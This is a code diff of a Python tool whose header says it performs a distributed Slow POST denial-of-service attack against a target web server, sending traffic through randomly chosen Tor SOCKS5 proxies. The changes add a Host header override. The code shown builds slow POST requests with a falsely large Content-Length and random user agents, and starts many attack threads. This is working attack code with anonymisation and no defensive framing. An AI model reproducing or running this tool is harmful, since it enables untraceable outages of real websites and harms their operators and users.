@@ -2,7 +2,7 @@
     Author: Andres Andreu
     Company: neuroFuzz, LLC
     Date: 10/10/2012
-    Last Modified: 10/11/2012
+    Last Modified: 10/12/2012
     Prog to perform a distributed Slow POST DoS attack
     against a given target web server across multiple
     randomly chosen SOCKS5 sockets leveraging tor
@@ -58,6 +58,7 @@ class httpPost(Thread):
         self.port = port
         self.sleepTime = sleepTime
         self.uri = uri
+        self.hostheader = host
         self.torip = slow_ddos_tor_vars.getTorIp()
         sr = slow_ddos_tor_vars.getSleepBounds()
         self.sleepRange = [sr[0], sr[1]]
@@ -71,6 +72,9 @@ class httpPost(Thread):
         
     def setHost(self, val=""):
         self.host = val
+        
+    def setHostHeader(self, val=""):
+        self.hostheader = val
         
     def setPort(self, val=""):
         self.port = val
@@ -94,7 +98,7 @@ class httpPost(Thread):
                            "Keep-Alive: 900\r\n"
                            "Content-Length: 1000000\r\n"
                            "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                           (self.uri, self.host, funcs.getRandUserAgent())
+                           (self.uri, self.hostheader, funcs.getRandUserAgent())
                            )
                 except Exception, e:
                     #print e.args
@@ -123,6 +127,7 @@ class httpPost(Thread):
 
 
 def kickOff(host="", port=-1, uri="", plist=[]) :
+    setHhdr = False
     threads = slow_ddos_tor_vars.getThreads()
     sleepTime = slow_ddos_tor_vars.getSleepTime()
     
@@ -132,12 +137,18 @@ def kickOff(host="", port=-1, uri="", plist=[]) :
         port = slow_ddos_tor_vars.getPort()
     if len(uri) == 0:
         uri = slow_ddos_tor_vars.getUri()
+        
+    hhdr = slow_ddos_tor_vars.getHostHeader()
+    if hhdr:
+        setHhdr = True
 
     tpool = []
     try:
         for i in range(1, threads):
             t = httpPost(host, port, uri, sleepTime)
             t.setTorPortList(plist=plist)
+            if setHhdr:
+                t.setHostHeader(val=hhdr)
             tpool.append(t)
             t.start()
         while True:
